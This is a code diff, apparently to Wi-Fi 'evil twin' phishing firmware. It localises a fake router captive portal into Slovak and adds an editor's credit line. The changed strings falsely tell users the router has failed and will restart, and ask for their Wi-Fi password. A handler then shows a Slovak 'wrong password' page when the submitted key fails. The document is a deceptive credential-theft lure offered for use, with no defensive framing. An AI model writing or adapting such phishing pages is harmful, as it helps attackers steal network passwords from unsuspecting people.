@@ -6,7 +6,12 @@
 #define TITLE "Prihlasovanie:"
 #define BODY "Nastali neočakávané problémy ! Router bude reštartovaný . Napíšte heslo od vašej wifi siete pre pripojenie k internetu."
 #define POST_TITLE "Prihlasovanie..."
-#define POST_BODY "Overovanie ... Prosím, počkajte na overenie. Môže to trvať až 1 minútu.</br>Ďakujeme za používanie našeho firmvéru. Za 30 sekúnd skontrolujte vaše internetové pripojenie na sieti."
+#define POST_BODY "Overovanie ... Prosím, počkajte na overenie. Môže to trvať až 1 minútu.</br>Ďakujeme za používanie našeho firmvéru. Ak sa táto web stránka vypne, alebo bude čierna, tak následne skontrolujte vaše internetové pripojenie na sieti."
+
+
+// EDITED by Fattcat
+// GitHub : github.com/Fattcat
+
 
 typedef struct
 {
@@ -213,7 +218,7 @@ void handleResult()
 {
   if (WiFi.status() != WL_CONNECTED)
   {
-    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 3000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Wrong Password</h2><p>Please, try again.</p></body> </html>");
+    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 3000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>NESPRÁVNE HESLO !</h2><p>Prosím, skúste to znova.</p></body> </html>");
     Serial.println("Wrong password tried !");
   }
   else
